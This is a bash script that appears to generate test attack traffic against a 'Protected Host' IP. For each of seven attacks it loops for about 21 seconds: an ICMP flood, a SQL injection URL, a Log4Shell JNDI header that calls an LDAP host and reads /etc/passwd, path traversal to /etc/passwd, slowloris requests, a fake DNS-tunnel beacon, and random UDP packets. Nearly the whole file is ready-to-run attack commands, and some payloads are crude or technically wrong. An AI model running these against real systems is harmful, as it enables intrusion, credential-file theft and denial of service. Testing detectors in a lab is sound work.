#!/usr/bin/env bash
# ==============================================================================
# kali_native_commands.sh — 20-Second Per-Attack Native Kali Linux CLI Script
# Autonomous AI Cyber Commander v4.1
# ==============================================================================
# Runs each native Kali Linux attack continuously for AT LEAST 20 SECONDS
# against the Protected Host IP (e.g. 192.168.56.105):
#
#   chmod +x kali_native_commands.sh
#   sudo ./kali_native_commands.sh 192.168.56.105
# ==============================================================================

set -u

TARGET_IP="${1:-}"
ATTACK_DURATION="${2:-21}"

if [ -z "$TARGET_IP" ]; then
    echo "Usage: sudo ./kali_native_commands.sh <PROTECTED_HOST_IP> [DURATION_SECONDS_PER_ATTACK]"
    echo "Example: sudo ./kali_native_commands.sh 192.168.56.105 21"
    exit 1
fi

echo "--------------------------------------------------------------------------------"
echo "  KALI LINUX 20-SECOND SUSTAINED OFFENSIVE TOOLKIT -> TARGET: $TARGET_IP"
echo "  Each attack will run continuously for $ATTACK_DURATION seconds."
echo "--------------------------------------------------------------------------------"

# Use kali_attack_simulator.py if present in the same directory for full 20s wave telemetry,
# or execute native CLI tools with a 21-second loop per attack:
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
if [ -f "$SCRIPT_DIR/kali_attack_simulator.py" ]; then
    exec python3 "$SCRIPT_DIR/kali_attack_simulator.py" --target "$TARGET_IP" --duration "$ATTACK_DURATION" --attack all
fi

# Fallback pure bash 21-second loops using curl, ping/hping3, nmap, and python3 sockets:
for attack in icmp sqli rce lfi slowloris dns zeroday; do
    echo -e "\n[*] Running $attack attack against $TARGET_IP for $ATTACK_DURATION seconds..."
    END_T=$(( $(date +%s) + ATTACK_DURATION ))
    while [ $(date +%s) -lt $END_T ]; do
        case "$attack" in
            icmp)
                ping -c 5 -i 0.2 -W 1 -s 1200 "$TARGET_IP" >/dev/null 2>&1 || true
                ;;
            sqli)
                curl -s --max-time 1 "http://$TARGET_IP:8080/login.php?user=admin%27%20UNION%20ALL%20SELECT%20username,password%20FROM%20information_schema.users--" >/dev/null 2>&1 || true
                sleep 1
                ;;
            rce)
                curl -s --max-time 1 -H 'User-Agent: ${jndi:ldap://kali:1389/Exploit}; /bin/sh -c "cat /etc/passwd"' "http://$TARGET_IP:8080/api" >/dev/null 2>&1 || true
                sleep 1
                ;;
            lfi)
                curl -s --max-time 1 "http://$TARGET_IP:8080/download?file=../../../../etc/passwd" >/dev/null 2>&1 || true
                sleep 1
                ;;
            slowloris)
                python3 -c "import socket; s=socket.socket(); s.settimeout(1); s.connect(('$TARGET_IP', 8080)); s.send(b'GET / HTTP/1.1\r\nHost: $TARGET_IP\r\nX-Slowloris: keep-alive\r\n'); s.close()" 2>/dev/null || true
                sleep 1
                ;;
            dns)
                python3 -c "import socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(b'DNS_QUERY: a9f8k7m6x5p4q3z2w1e0r9t8y7u6i5o4p3a2s1d0f9g8h7j6k5l4.c2-tunnel.org\n', ('$TARGET_IP', 53530))" 2>/dev/null || true
                sleep 1
                ;;
            zeroday)
                python3 -c "import os, socket; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.sendto(os.urandom(1350), ('$TARGET_IP', 53530))" 2>/dev/null || true
                sleep 1
                ;;
        esac
    done
done